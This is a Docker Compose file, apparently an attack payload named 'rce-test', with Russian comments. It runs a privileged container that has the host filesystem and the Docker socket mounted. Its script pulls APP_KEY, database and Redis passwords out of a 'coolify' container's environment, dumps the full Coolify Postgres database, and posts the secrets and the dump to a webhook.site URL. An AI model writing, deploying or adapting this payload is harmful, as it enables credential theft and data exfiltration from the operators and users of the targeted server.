version: '3.8'
services:
  rce-test:
    image: 'alpine:3.19'
    privileged: true
    network_mode: host
    volumes:
      - '/:/host-root'
      - '/var/run/docker.sock:/var/run/docker.sock'
    command:
      - sh
      - -c
      - |
        apk add --no-cache curl docker-cli
        
        # 1. Вытаскиваем переменные окружения из главного контейнера coolify
        # Там гарантированно есть APP_KEY, DB_PASSWORD, REDIS_PASSWORD
        docker inspect coolify --format '{{range .Config.Env}}{{println .}}{{end}}' | grep -E "APP_KEY|DB_PASSWORD|DB_USERNAME|REDIS_PASSWORD" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=coolify_env_vars
        
        # 2. Извлекаем пароль от БД и делаем полный дамп
        DB_USER=$(docker inspect coolify --format '{{range .Config.Env}}{{println .}}{{end}}' | grep "^DB_USERNAME=" | cut -d'=' -f2)
        DB_PASS=$(docker inspect coolify --format '{{range .Config.Env}}{{println .}}{{end}}' | grep "^DB_PASSWORD=" | cut -d'=' -f2)
        
        if [ -n "$DB_PASS" ]; then
          echo "DB credentials found, dumping database..."
          docker exec coolify-db pg_dump -U $DB_USER -d coolify | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=full_db_dump
        else
          echo "DB credentials not found" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=db_creds_missing
        fi
        
        sleep 3600
